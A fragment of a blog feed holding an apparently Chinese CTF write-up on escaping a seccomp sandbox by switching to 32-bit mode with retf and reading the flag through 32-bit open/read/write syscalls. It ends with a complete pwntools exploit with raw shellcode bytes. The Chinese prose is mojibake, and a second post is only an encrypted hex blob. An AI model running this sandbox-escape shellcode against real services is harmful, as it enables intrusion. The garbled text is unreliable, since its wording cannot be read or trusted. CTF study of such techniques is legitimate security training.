å°„å°äºç­‰äºå››å­—èŠ‚åœ°å€</h3><p>ä½†æ˜¯æœ‰ä¸€ç‚¹å¦‚æœåˆ‡æ¢åˆ°32ä½å·¥ä½œæ¨¡å¼åï¼Œé‚£å¯„å­˜å™¨ç”¨çš„åˆ™æ˜¯32ä½å¯„å­˜å™¨ï¼ŒåŸæœ¬64ä½å¯„å­˜å™¨é‡Œè£…çš„6å­—èŠ‚åœ°å€å°±æ— æ³•æ­£å¸¸ä½¿ç”¨äº†ï¼Œå› æ­¤åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦è°ƒç”¨mmapæ˜ å°„ä¸€æ®µå°äºç­‰äºå››å­—èŠ‚çš„å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åœ°å€ç©ºé—´ï¼Œç„¶åæˆ‘ä»¬å°†æ‰§è¡Œæµè¿ç§»åˆ°è¿™ç‰‡åŒºåŸŸä¸Šï¼Œå› ä¸ºåœ°å€å°äºç­‰äºå››å­—èŠ‚æ”¾åˆ°32ä½å¯„å­˜å™¨ä¸­ä¹Ÿæ˜¯okçš„ã€‚</p><p><img src="/../img/2706180-20220912231042351-1607796039.png"></p><p>ä¸Šå›¾æ˜¯æ‰§è¡Œmmapæ˜ å°„äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼Œä¸‹å›¾æ˜¯æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readå°†æ•°æ®å†™åˆ°åˆšåˆšæ˜ å°„å‡ºæ¥çš„è¿™æ®µåŒºåŸŸ</p><p><img src="/../img/2706180-20220912231052458-225522993.png"></p><h3 id="åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼"><a href="#åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼" class="headerlink" title="åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼"></a>åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼</h3><p>åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼å…¶å®å°±æ˜¯ç”¨retfæŒ‡ä»¤æ¥æ§åˆ¶cså¯„å­˜å™¨ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬å°†æ‰§è¡Œæµè¿ç§»åˆ°æ–°æ˜ å°„çš„å†…å­˜åŒºåï¼Œå°†<strong>æ ˆä¹Ÿè¿ç§»è¿‡æ¥</strong>(å› ä¸ºåŸæœ¬çš„æ ˆåœ°å€æ˜¯6å­—èŠ‚çš„ï¼Œæˆ‘ä»¬åˆ‡æ¢åˆ°32ä½å·¥ä½œæ¨¡å¼åæ— æ³•å†è®¿é—®åŸæœ¬çš„æ ˆ)ã€‚<strong>è¿ç§»æ ˆçš„åœ°æ–¹è¦å’Œæ˜ å°„çš„èµ·å§‹åŒºåŸŸé”™å¼€</strong>ï¼Œä¸èƒ½å°†æ ˆè¿›è¡Œæ–°çš„è¿ç§»åï¼Œæ‰§è¡Œpushæ—¶å¹²æ‰°åˆ°æˆ‘ä»¬åŸæœ¬å¸ƒç½®çš„æŒ‡ä»¤ã€‚</p><p>é¦–å…ˆæ˜¯å…ˆå¸ƒç½®ä¸€ä¸‹eipå’Œcsçš„æ•°æ®ï¼Œå…ˆpushåˆ°æ ˆé‡Œ(è¿™é‡Œä¸€å®šè¦æ³¨æ„æ˜¯äºŒè€…å…±ç”¨ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œä¸€ä¸ªå€¼ä»…ä»…å å››å­—èŠ‚)ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æˆ‘æ˜ å°„äº†ä¸€æ®µ0x100000çš„å†…å­˜åŒºåŸŸï¼Œç„¶åè¦åˆ‡æ¢åˆ°32ä½çš„å·¥ä½œæ¨¡å¼ä¸Šï¼Œé‚£ä¹ˆæˆ‘å‹å…¥çš„æ•°æ®åº”è¯¥æ˜¯0x2300100000ï¼ˆå› ä¸ºè¦è¿ç§»æ‰§è¡Œæµï¼Œæ‰€ä»¥ç»™eipå¯„å­˜å™¨çš„æ˜¯0x100000ï¼‰(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220912231102480-775571867.png"></p><p>ä¸‹å›¾æ˜¯å·²ç»æ‰§è¡Œäº†retfï¼Œåˆ‡æ¢åˆ°äº†32ä½å·¥ä½œæ¨¡å¼ã€‚(æˆ‘ä»¬è§‚å¯Ÿä¸‹é¢çš„æ ˆä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ‰§è¡Œåçš„æ ˆå·²ç»æ— æ³•ä½¿ç”¨äº†ï¼Œå¯¹æ¯”ä¸Šé¢æ­£å¸¸çš„æ ˆï¼Œå‘ç°åªä¿ç•™äº†4å­—èŠ‚ï¼Œè¿™å°±è¯´æ˜å·²ç»åˆ‡æ¢äº†32ä½å·¥ä½œæ¨¡å¼)</p><p><img src="/../img/2706180-20220912231725874-1239549974.png"></p><p>æœ€åå°±æ˜¯è®°å¾—æŠŠæ ˆç»™è¿ç§»è¿‡æ¥(å¦‚ä¸‹)</p><p><img src="/../img/2706180-20220912231124110-1797761142.png"></p><h3 id="orwè·å–flag"><a href="#orwè·å–flag" class="headerlink" title="orwè·å–flag"></a>orwè·å–flag</h3><p>ç„¶åæ‰“ä¸€ä¸ªå¸¸è§„çš„32ä½orwå³å¯ã€‚ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="/../img/2706180-20220912231132815-1193419232.png"></p><h3 id="æ‰§è¡Œ32ä½ä¸‹çš„execveçš„æŠ¥é”™"><a href="#æ‰§è¡Œ32ä½ä¸‹çš„execveçš„æŠ¥é”™" class="headerlink" title="æ‰§è¡Œ32ä½ä¸‹çš„execveçš„æŠ¥é”™"></a>æ‰§è¡Œ32ä½ä¸‹çš„execveçš„æŠ¥é”™</h3><p>æœ€ç»ˆæ­£å¸¸æ‰§è¡Œæˆ‘ä»¬çš„32ä½ç¨‹åºä¸­çš„ç³»ç»Ÿè°ƒç”¨å³å¯ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•æ‰§è¡Œexecveè·å–shellï¼Œå› ä¸ºexecve(â€œ&#x2F;bin&#x2F;shâ€,0,0)å…¶å®æ˜¯å»è¿è¡Œäº†&#x2F;bin&#x2F;shè¿™ä¸ªç¨‹åºï¼Œè€Œè¿™ä¸ªç¨‹åºçš„ä½æ•°æ˜¯è·Ÿç³»ç»Ÿä¸€æ ·çš„ã€‚å¦‚æœæ˜¯64ä½ç³»ç»Ÿï¼Œé‚£ä¹ˆ&#x2F;bin&#x2F;shè¿™ä¸ªç¨‹åºå°±æ˜¯64ä½çš„(ä¾æ—§ç»•ä¸è¿‡æ²™ç®±)ï¼Œè¿™æ ·å°±å¯¼è‡´äº†æˆ‘ä»¬è™½ç„¶æ˜¯å·¥ä½œæ¨¡å¼åˆ‡æ¢è¿‡æ¥äº†ï¼Œä½†æ˜¯åç»­æ‰§è¡Œ&#x2F;bin&#x2F;shçš„æ—¶å€™æŠ¥é”™äº†ã€‚</p><p>æ‰§è¡Œ32ä½ä¸­çš„execveæƒ…å†µå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220912231141493-2079768539.png"></p><p>è¿™é‡Œè¦è§£é‡Šä¸€ä¸‹å›¾ä¸­çœ‹çš„æ˜æ˜æ˜¯æ‰§è¡Œçš„munmapï¼Œè¿™æ˜¯å› ä¸ºå·¥ä½œæ¨¡å¼è™½ç„¶åˆ‡æ¢åˆ°32ä½äº†ï¼Œä½†æ˜¯è¿™ä¸ªgdbè°ƒè¯•åˆ°è¿™é‡Œï¼Œå®ƒä¾ç„¶è®¤ä¸ºè¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ˜¯64ä½çš„ï¼Œæ‰€ä»¥å°±æ˜¾ç¤ºäº†munmapï¼Œä¸è¿‡ç°åœ¨ç¡®å®æ‰§è¡Œçš„æ˜¯32ä½ä¸­çš„execveç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å¯ä»¥çœ‹è§çº¢æ¡†é‡Œçš„æŠ¥é”™æç¤ºï¼Œé¦–å…ˆç¬¬ä¸€è¡Œæˆ‘ä»¬ç¡®å®æ˜¯æˆåŠŸæ‰§è¡Œäº†execve(â€œ&#x2F;bin&#x2F;shâ€,0,0)ï¼Œåˆ›å»ºäº†æ–°çš„è¿›ç¨‹&#x2F;usr&#x2F;bin&#x2F;dash</p><p>ä½†æ˜¯ç¬¬äºŒè¡Œå°±æŠ¥äº†ä¸€ä¸ªé”™è¯¯ï¼Œè¯´æ˜¯Bad system callã€‚è¿™å°±è¯´æ˜æ‰§è¡Œäº†64ä½çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åè¢«æ²™ç®±ç»™ç¦ç”¨äº†ã€‚è¿™ä¹Ÿå°±éªŒè¯äº†ä¸Šé¢æ‰€è¯´çš„&#x2F;bin&#x2F;shè¿™ä¸ªç¨‹åºå°±æ˜¯64ä½çš„(ä¾æ—§ç»•ä¸è¿‡æ²™ç®±)ã€‚</p><p>å› æ­¤æˆ‘ä»¬ä¾æ—§åªèƒ½ç”¨orwè¯»å‡ºflagã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;chal3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    rax,0x9</span></span><br><span class="line"><span class="string">mov    rsi,0x5000</span></span><br><span class="line"><span class="string">mov    rdi,0x100000</span></span><br><span class="line"><span class="string">mov    rdx,0x7</span></span><br><span class="line"><span class="string">mov    r10,0x21</span></span><br><span class="line"><span class="string">xor    r8,r8</span></span><br><span class="line"><span class="string">xor    r9,r9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rsi,rdi</span></span><br><span class="line"><span class="string">xor    rdi,rdi</span></span><br><span class="line"><span class="string">xor    rax,rax</span></span><br><span class="line"><span class="string">mov    rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">movabs r8,0x2300100000</span></span><br><span class="line"><span class="string">push   r8</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x48\xC7\xC0\x09\x00\x00\x00\x48\xC7\xC6\x00\x50\x00\x00\x48\xC7\xC7\x00\x00\x10\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x21\x00\x00\x00\x4D\x31\xC0\x4D\x31\xC9\x0F\x05\x48\x89\xFE\x48\x31\xFF\x48\x31\xC0\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x49\xB8\x00\x00\x10\x00\x23\x00\x00\x00\x41\x50\xCB&quot;</span></span><br><span class="line">p.sendline(s)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">orw=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    esp,0x100100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x0</span></span><br><span class="line"><span class="string">push   0x67616c66</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">push   0x5</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x4</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">o=<span class="string">&quot;\xBC\x00\x01\x10\x00\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x04\x58\xCD\x80\xB8\x01\x00\x00\x00\xCD\x80&quot;</span></span><br><span class="line">p.sendline(o)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.cnblogs.com/vi0let/articles/15978203.html">ç‰¹æ®Šæƒ…å†µä¸‹sandboxçš„bypass - vi0let - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.jianshu.com/p/4a0a70ddec37">32ä½64ä½äº¤å‰ç¼–ç  - ç®€ä¹¦ (jianshu.com)</a></p><h2 id="é¢˜ç›®é™„ä»¶ï¼š"><a href="#é¢˜ç›®é™„ä»¶ï¼š" class="headerlink" title="é¢˜ç›®é™„ä»¶ï¼š"></a>é¢˜ç›®é™„ä»¶ï¼š</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0">https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0</a><br>æå–ç ï¼š7gt0</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ²™ç®±é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœªåˆå§‹åŒ–æ¼æ´--strcatå‡½æ•°æº¢å‡º</title>
      <link href="/posts/5bd42122.html"/>
      <url>/posts/5bd42122.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d1e8b6a8473138709316479b78cdafdea69da2065c6a9d3c438d23ad6c9eaeb8">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a40207b9a5a630f6fb9dfd5c1e8772653aedef1f3f84cfa7a601c900adc14a50ec9cc547db5e075fb13519719e6362712e247643f6f7743951dc253c8d8f5a1131a67449627e5f81d30e4d3369463c4007a330e4b15d516a5d953d7498239633020a826299438e359df503fe6303d2fc4e562c1eeed27665fc13d09522b8cdbd6ba8dd9ffae6358b4578f1a3a924207927d9b5150ca894435d0147f631536d698e2f57a86b057360051a4c2f0949151f0ccaf1e3990d6a9de2d5c422829bf9828bad74fbb1fe7ae5059884593a9d02cd3c6beb1c43ac017d5ee5aa52680545f192140362874391ec4069eb9f5b8042653abe5857a1cf8e9f546921a4754c7c6f545bef87ba7b98ccd6d7beffd7fa528483c7af0cc76cbdd62876c1c5934a8e8d81e4526a0f4b70b27fefa1017db9e7c21f0bc512fb8219d5c565fdb424c40010cfd02c7c38590f2c40db9de0515992e42e9515b6d174092a5a99be474d0033d03568edb3da51e26f1a202d013faceeae33c1569013d9c8dcb69204c3486edeaa9dabc2b000d68dd7466d4ed051203809322930d3051be88ad50e5edcf03a01dbc2d7c170cd343a3225cc8c2b9c2331d49b7e1d49d3b88802248a26996e5041e81ef0ead291e94a2842912de6c3e30457d33e61528818c932c8285f70760ad474497e28f5a003426711ec1118822507077a7e976a6f24016d1af371abb49a76c2a014ae18764cef1e9a9809a80055af8e72e59247985a57f9b6d9fca2dcf2e83b53f944c383d93dcec495c3bafe00241653a7d19382adeb91b597d870826fec4dc370831943df6f59d98ff7153956891290fb3357846eccffea8571c12ee4697c3bcf3fbd761e1630f6632759ddd44780bf4e565868d3f182148e0530999a40b32c41ecff9acca8a771c4a305e4ec2028a5e5172dbbf2662f4a633f71d0f4883b96792a1a51c96ea18885eb198c7755e7f8eb10263a8aeedf846635c8dd0bd379714e451dfa11062af9c11b32f711dc190b3c5a503491cd1a35767f64df0107d1beea23d5cdf772b0df522ad1885ca09a0280f1bdf30445d33f7f4bbbc7f58aebd24446413d649be9f75834ca20126d940f258986b4767ca065156cd6a192d90bd0d7e8065cb3460cf4c99044bcafca1eefa0ac9c46a380728ee47ec65d38cdc5de33fa8bb24a887f3184d55fb6896b0071f9a22c297de822c100a2a84be57337102acf78a291041ac164413da21de639c1f9fc26244dd24c9b57f4a9d41386bafe5152fd9f92a79ef789b61cb21ca10d04a3f471773b9cf8cece9585591c515c57cd60fe1f50290b205a2dcb842175c69d1534336d2c0bc1cb15377b18ccf1d9ebae78336c17ef9b0ffd420cff79245a416b66a58983e6fd5deeafe7e02b189db35d6ff295b3c4ad379548fc7ec57392077446a38cf36182120b128fc3faa21ea4268120aa3f2ad07ebdbed8fb6ddaf1f9ed75156437e6cb60f454beef3b042139597a3eb78611b49db10f50d64f46da84d3f155db0e31eba1882738f67a5484d6d366293ff1974e0e7e97789e31dca90f5327533e362f419fada46745a1103c0378b054919652bd2d64a48b5e16c92c0007d7d5d296f1590a8c7da2f59cb741301e8ab13ba3ea3466532f1f5a0304d73a1fd603520e7ee0fc65742c7d4e51d8bdcab92c88e0ea7febb98e09b6c37e48919dae59c80f628da3c32c8fdfa642f39cec203cd45a716ca0838937538bf23f132246c61bc22f407c4f41155c146c1a35a6ce4d18bdf63ab17e6e91ba5f0fe995003a502942feaa81c8503d6d2be6e75233374505545ef7a56edc7627f71544a59969f5d187f7f1e74635feba854e7e7d18ace28757f7fb0b7111c4642c05b2134323fd52bb7eb3201a445768f11c0fe7f8a158fac37bd942fa2f4d680dafc9e04eababd3e78a35b5d200a4ec2ec8cee4e16368652b519e57c447a28577c1e2efba959132c04095089c7d1e02fb2eb10bccf904ac56daff6b54595f417dbe4a5c89a5bac5c6d14e504a00e70019da4ff33f8b0777882e95796dcb71e5527f2d3ea2fe367c6d9c304d2a15db44451bb07234a307292623cdaa09ce65a2e0620b5d9ceec5dc6a809fda093b4fa0a2ebbed293cf5806862593f7580acc44f9495306efab86984c8494d7a44ce55da387b4c78e846bb814734d22850597925a1183cf47240ff0c54f247b253778de0ea859baf24d2c70eae208a4cd6f1c27cbbf9f3db8f35c4b8ad16ac99b84eed973c6938452e95bbd1ca08ed2f36e9fd1a3ab2e4876bccfd5414057f06340319b2355f1bede68482f995726de1f309a5652b3a9e17dce6aba3c8f0a2f47abaec4a453e7938a66667a0abf9eeec37120a6c7fd246ffb644377e968aa5cc5226fc3bcdccfcfa39b4f731e07977c48ea80b81bad70117771563cf615c0fd92adb8948edcc7f3489d07a0562f929ffe7595ac25ad2c69eb5db7d8e1ee3a71ef68ba1c5ba702d4171281152a843208777e5e3a4e409486d617e4bdad5cac63278c9d7c25ef589e23db7b877155fa90d32ff9e12e0cc25e49640f1a9697e25fe5fc9f6217f4b66f83d7db3904f939d7fd70d5d685211feac92317c66d3e0e6b3dcafc43c1c5855600ac7febc86496671a21a4e36c645d7ad4c28e1e5e9172843e9e01e88e94bfe597f44d262d53a7542e3cacf3f2d951703dce70a4d3b781b367ec304f466637da9d172784deb166adc2e4eb55df3753d457ccf595a2bd16ec5d0bfbc5db24d3a95bd9138e1d5f023031a66ba588d0c7c4d8a49100457c704aaa0d81a0c197a0302df9c07665d133ed5f4b7c48cb5b620975bda66550515a5cb8483204f50963fbe78548c8c4be95bd444fd031cf4f9ae8f10df6347bc69215fdc9e8c8ddc24691cbffcf4e03d7b57913a9cf58e254daeb4d3f714d2387072209593769cdc57321e27b3f2fb76f41356fd8a2965a2bb63f18827d1dea71683db4da0652003a4d544a7118f95da80a286aa93f7f70adcb60467ff5cb3eafa49820768ed109b1b4919573e8a947a151a9f74f3b4fcab4af02583a46914ae947e3e7dee5a7686fb9fdafe8ac9dfc1645c371583f4161530f66e0203ea360e308c891b7c3b350d39e502e2286ec8e68bf7bb1d1c466da879d4fc11a8d03f1957cf375cb4087437aecdd03eb9528ef27991e8366cc8ff6d38de30a7525c9f5355ec8cd0b3ede52a05c79e04aaa185793ee7b9a0c35950de632c9b9bfbe90a3993d03fbaf5b9576efb28be5de08377e69e21997ecd3bf28fbeaf51a4ea94e607fcca9e3d899ef99b89dd0cc82fc518a786a12d5f74652938e1a960b4aff5f1d732560a70a78c6428b3cd8a9a19b0752d3754f3c5bade91b75acc5f7a9080cc37e3278c66fc565622affbc3f90bdb9263ff71f94bb5380864351e3f611b6ccdb47034da710966e95f273ed92e49d898c2ba8a72c4043c618439bac570f29b119c5643cf4e88928eaf424b77e21f5f62c5623689f82a9f6e36ff16585f312f8b4e6a62d89982a7baa04a88a6c8b83870f316fd3fb442b7fcd5369897531edc469c7752e632ac05a44c1e20f6a1e78c4b093f3e1deaff00819ee70e5ff57949d074d954c7c8969203cf1f211c1d65d2457ef63e42c5a4e67f4650e60250fb4f9e374ab09cb1e55fffea877ca16afb3b049ee39859c963f3b4938bdb1d264ef63138885d4745dddb2db925b5106bf53b0022352184e6735197bb6e6253ac0041ca13a85dc48d5ea8165626adf883ece9db0e2d8a4e58ffdf6417f6b1b3822c1886c664f4b25fff4ac98466f6608782575f58ecb3a72f6c6342de33d07b25070911d0dcf45ad1904dfba742f41f8809953a4e600b4d09757d3cb9e0c5ddc848f92b18a3be2cc98609c512a4c3d6283ef456b1a654760a9e4da2dcdb534750e471d2563831916cba4492553c860fba0ef682e07f2e75ddf9c1833ae0c76e19606755e88271e14b2e8a392dbcff03e07784ebf1e6b9570acdcc91b7d2c32233fb6b37437840e024ec8dde0e093c128390da327a5e67eb0b6df2252e85f72ef2d8260ec8f31fccfe2415b3e00f01a5de4bae6523b07681e67090c3ed4a55fe01238194b5ec34530faea22da52a734454da6a966a51127af4ca9dddbd2f19058753d40d439764d33741e60ef7a00ae1dcf8ebc1234e4f17d4b6b14df629dff91c34689dc51c4ad6b009974bdbc908df6ae3e8007d23167e90a3b0cbc12d49a3473a3eb89c72d8185ed9852693562585cd5e05feb791c2a47159fc65b29a9ea4f419648653c22cbcdad0d84987cdef9618355cd230aef13e47dddc92012417d73d19162f403420b9089d64da196ac3f157f67f9887dfe6ab16c7ad4b8f327cd32b4d5847293d90ea479833b9cae9c539a909159c1805480693d547503b08fab57862e4ab61ddd71247683aa916f942f5b62a5335a2cd7ef537c8702b7788f835cb1e807c83e1eb46aea1a7f1cc04fe0a008f494c1758c61c5c27e47f8f85fdfad2dadd343b45f70847a54bb739b07f07bed9f14efe334b0f5e6b0d5b8669c36384b06697a6c557a95484aaa9daa56d1d63809ba82a5a4284482f0f8f075a67955b49909f8e871756e67ad11486df7cacfe3d4a39f00a609a0171e31d49627a2cb6d4d3e9c6deff68e69ab9304e159e13430bfc9cdd1785d704bde85778e668cd41886d54ff7bc3ba15f2d0c47525a0cb7c5eabff96579a4e646fbbaba4cae4bc1dfd9f4cd86c0068ac7b2d8f7eb3ce0b32ba96bc390fc8602858068e7acf82ad3f74dbf5fde1591d9abe853f7d196f1f75b0406196baa2f44afba4adc1e79e02bdd6370e87ab1351808596e5fcee72596016468a500eb0313caac882d30680ae86e510d9fb285120cbda2e56be9541852d481a83e78330b810bf8403c26643b7827fc8e42a982332ea2b0b363312a41d73ec98aa5a6ec8bd47c40b03aa9f9544e53bb97c2acfd87f4d723529a09302389215518fc56cc7243aa84d8594cb94d48e9f0fa0c3c6e573cef82de6373eb2c54305f6de822db81130fa5544062d423e80869bf3efcad20b5ddf28a217f6eec713655e8798b3353abf3b3cbd7977d659d48ce30ebcd3bf8e62eb863571ab55f60b2f70b6ec33189ebda86fdacd4abcce42809d6b70ff6808fe5b72c2f79a856b5bd2aed64269f65e465687f09c96face8373bf2021e2efa2bb3574d1832fb74186081425ec14b353ea48212318431563b170086074625dcbc74df7b40e835b77468e949a2b45016c9edcc7068a1ba29ce7273b31769c2a9cad9f56b3c7ec9dc0ec944704dbcbc3cb4f41f7075ad521f32ec27dc734c4dfb519a78227d9d9a7054312621ffa6a920a1d914f3e0e5ca2704026cf890396fc32030416fe92ec654698b00883637259259741139cd3479006cce6e4ddd168e9e3987aafecf7353138a2d5de658b8f9475805bb4d0d15f26214762e7a9e7d2b3dbff0aabc17b94be80352f41a76f40cf317c4e48f35b4f325cbfc7f6971dc6917714a33f5f147500b2c8496a2c3f693a711c4e40d186672dfdfda287215a019a8405d5011a69a89c000b78b50b5659632f3b38db755e237b5f8e1fc3134b80633cabaa3af8989127d940b403f3a71e8a7c947652e5bcb3ee7d06152d4780ba1c3d3ee01ff84f6644ef072a00a79a0e17f27b08d3545962cf621a174bf0e80393673c5e4377f83442de4bb862699c6258421e39165f96fa5d287e4a07ed9ab884affb221e4dc88fd99c90f81b3dfca5fe0423bc8ca6976b7fd2ebeeaf963c0a247745ac190d34751f5f5097c2a03ffdbd2aa90e58aa856f475eca8afb33afecb8bb953492d4d06cde9bbc6a6e2f4094c3031c596f46d656284af9c4da4b53c7014f4a253610ae993d15dd143bb900be717385584ea3d4047a8faa419f5d333fc633913a5504b0aaa3e7ae1d23cafb228539d1a0d0bc92247f5dba8f7717fa128ff07e216ebad5f2111787156acbd623d1ceadc584f0b44f3d1b63c3b8dc7b25628e24d1015cea7563bd0d90e6f2597fc78333e72b29e14d7f2fda17f055f7a37f7b40d909ca49062cce8e55d2adce3b3644b97d7fde6ba2a47e68055e90853fde61248021ae5acaf6ff527fcdf7ae97f4a911caffc137af013c2e86ac0fd7d3f03982007dce0b78129a402d685c592291b594af40f1432f90d25c2cea0c253289c69401a3d964a6669b1c2a17230a1d1d16facb7c5f5b69875cbad2dfcfb4c1a3d3328256c5fa9a67abc6f2349525375a7694ecfd6d87a8e3601ea14be2e2459ee98b18b7a80f0b218cc3acbf206014d5ff3172d6a0d9f2d896e4d695a37f241745b5017b44029127e20a0687cd072f6ca4edff30a0001fa070c82364acfd85e047fb51d86412ce2e545bfb390b9b50205a3753b6f65edd717f01839b37d0624ee120b07bd81c5bdf6d0e44e7732693110fbc6f81c4d0ddedcda4483102fb74d4fff4b304759cd463372287024f85896e9d4db74de6d4b09cfbcae0d800422b5cd157707ec68e6544220dcacb6944a7943cb1416d0552c690e3aaa24f341aec712899bd756064fdc248bba08dfa25e5499178d4eab8a3a3c59435d52d3612a2053203df897e5714b20110b377d5c33872b392f229882495bf28f5cd7f3d197d044f01e96b89da672f7d73289f0f16347de4052c2581b327969b2839f7d2c6ac8825c02220ad7e85223b59821374885e049de104fec99fdc1d92f4862653e322d544beced897b9660a1f2caa1cccc6a0480e32cf50635f9f41567e0459f1bfaf8dc6804ca67b1fe1050c3fa4fe9aa3fa6f26cf70e96adbe8db397d3f3759fcc5c76946917d6667495c59ce5110383c888d153b352b220b14e1034ac631539fc40f169cd3421a51be72c4fd3718a09c9696ac0d7d542344d30212df8a59a0de6c6bccd7b32d206428e37e9c35a3200d2c020d14b3213ecc40925c331511125d6b21ab2272773cf9d2403b579aaf9ef780522b63a69116c361df28202c8fd1021b8b754bf08059aca588d3eb41e0b31dc137dc06d1eca3131eb6da0dbf35bc25421716a7dbc41e73039932276d5d32daa0461485d399b4dde060608594fff1865c38cd28f18fe9edd65a26c549669beceb12d284aeed25b434aee3f62684731ec82ce60211919f97007a722c623a0358ce06aed1f7221e6c8a532ec53c653ce3cfa49451c6190ee10c9dd47fd564c6a81f636d1c03a8d46936a0dcdfb9fc2b2c403bf568c4ff3a4043712a5a34308aba01e608d74a83754263317320e1149c6929ec1c830b524291156b59a84a4fe52bc2b4c492410fa6b4474209e0666569b711d676ac947ae89ada59d01d3371c93fec0fa0f14a0a1cd5d2ca68e15423ee26dc7241af1b8187802219164e3c4529837ea394749a543da1849aa4e603d12734338e63ac48e19198c71c981dfed48ef06f43c3ecd2b679bd6dda3571258601119f5aeaf04f6a6073094b99900e927a4c9fc139c65d74d66ae60864071b638f9184870770aa696ebeaf416f4ce3190ec4f245c359d70e47aeac8d1ffe16f6a2744dcdd80fe3bfc24b1b989c9e3dee175d100e8c341263cd246011177ea665c0ef3ed36c21a216b9dadd3ccaf4a53f2ab17708724f3e767ceb03261cfe5280d4afcafc81e748b1bc08f71de755f76c357ec38677b0bc65b70c28311d60c12ea472a2eae368940918d3347dd7c275003b763e685a0a00e021578eaccb5aa5fbc6507a948e07829ed7a412460c2ed5822e2b6297651515d98473eda377ced20e47e269a935f03805e09bd2ce795aabf1ed3b3684ce0a55ed2b0886074edd8236b8da0a3b1c4a1f9ce5a895e71a9209c55d6b4de7e67ce3a034c49a4495708b227f0fcb04b91e696a8c703e09c674e2874d594eab2663d14ec9724c35e38f7ec5ac4b06782939b3aa5794c2035f503adc92c87efdee